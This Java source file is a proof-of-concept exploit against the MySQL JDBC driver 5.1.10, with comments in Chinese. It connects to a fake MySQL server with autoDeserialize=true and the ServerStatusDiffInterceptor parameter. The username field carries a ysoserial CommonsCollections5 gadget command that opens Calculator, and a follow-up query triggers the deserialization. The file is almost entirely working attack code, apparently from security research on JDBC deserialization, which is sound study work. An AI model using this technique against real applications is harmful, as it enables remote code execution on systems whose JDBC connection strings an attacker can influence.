package org.su18.jdbc.attack.mysql.serverstatus;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

import java.sql.Connection;
import java.sql.PreparedStatement;

/**
 * 使用 https://github.com/fnmsd/MySQL_Fake_Server 进行测试
 * 依赖版本 5.1.10
 * 驱动名称 com.mysql.jdbc.Driver
 * 属性名 statementInterceptors
 * 连接参数 autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor
 * 备注 5.1.10 及以下的 5.1.x 版本建立连接后需要执行查询才能触发漏洞
 *
 * @author su18
 */
public class Attack5110 {


	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://localhost:13308/whatever?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";

		// 建立连接
		Connection connection = ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "yso_CommonsCollections5_open -a Calculator.app", "");

		// 建立连接后需要继续查询才能触发漏洞
		PreparedStatement statement = connection.prepareStatement("select 1");
		statement.execute();

		statement.close();
		connection.close();
	}


}
